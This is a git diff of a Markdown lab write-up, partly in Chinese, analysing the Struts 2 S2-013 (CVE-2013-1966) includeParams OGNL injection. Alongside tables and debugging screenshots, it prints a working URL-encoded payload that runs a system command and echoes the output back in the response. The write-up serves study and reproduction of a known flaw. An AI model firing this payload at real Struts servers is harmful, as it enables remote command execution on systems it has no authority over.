@@ -2,11 +2,18 @@
 
 ## Summary
 
-Impact of vulnerability: Remote command execution
+| Who should read this    | All Struts 2 developers                                      |
+| :---------------------- | ------------------------------------------------------------ |
+| Impact of vulnerability | Remote command execution                                     |
+| Maximum security rating | High Critical                                                |
+| Recommendation          | Developers should immediately upgrade to at least [Struts 2.3.14.2](http://struts.apache.org/download.cgi#struts23141) |
+| Affected Software       | Struts 2.0.0 - Struts 2.3.14.1                               |
+| Reporter                | The Struts Team                                              |
+| CVE Identifier          | [CVE-2013-1966](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-1966) |
 
-Affected Software:  `Struts 2.0.0` - `Struts 2.3.14.1`
+## Problem
 
-Problem: `Struts2` 标签中 ` <s:a> ` 和 ` <s:url> ` 都包含一个 `includeParams` 属性，其值可设置为 none，get 或 all，参考官方其对应意义如下：
+`Struts2` 标签中 ` <s:a> ` 和 ` <s:url> ` 都包含一个 `includeParams` 属性，其值可设置为 none，get 或 all，参考官方其对应意义如下：
 
 1. none - 链接不包含请求的任意参数值（默认）
 2. get - 链接只包含 GET 请求中的参数和其值
@@ -16,19 +23,20 @@ Problem: `Struts2` 标签中 ` <s:a> ` 和 ` <s:url> ` 都包含一个 `includeP
 
 ## Environment
 
-Struts2 Version: `Struts-2.2.3`
-
-Server: `Tomcat 9.0.34
-
-IDE: `idea 2020.1.1 ULTIMATE`
+| Struts2 Version | struts-2.2.3           |
+| --------------- | ---------------------- |
+| Server          | Tomcat 9.0.34          |
+| IDE             | idea 2020.1.1 ULTIMATE |
 
 ## POC
 
 ![image-20200720152355857](img/20200718101337.png)
 
-## Payload
+payload:
 
-`HelloWorld.action?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27calc%27).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%27dbapp%3D%27%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D`
+```java
+HelloWorld.action?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27calc%27).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%27dbapp%3D%27%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D
+```
 
 ## Debug
 
@@ -36,7 +44,7 @@ IDE: `idea 2020.1.1 ULTIMATE`
 
 `s2-013/web/WEB-INF/lib/struts2-core-2.2.3.jar!/org/apache/struts2/components/ComponentUrlProvider.class:73`
 
-![getIncludeParams](img/getIncludeParams.png)
+<img src="img/getIncludeParams.png" alt="getIncludeParams" style="zoom:150%;" />
 
 然后进入到`beforeRenderUrl`函数中。可以看到这个函数将我们提交的恶意参数include进来：
 
@@ -54,7 +62,7 @@ IDE: `idea 2020.1.1 ULTIMATE`
 
 ![1595136376298](img/buildUrl.png)
 
-![1595136451346](img/buildParametersString.png)
+<img src="img/buildParametersString.png" alt="1595136451346" style="zoom:150%;" />
 
 ![1595136519253](img/translateAndEncode.png)
 
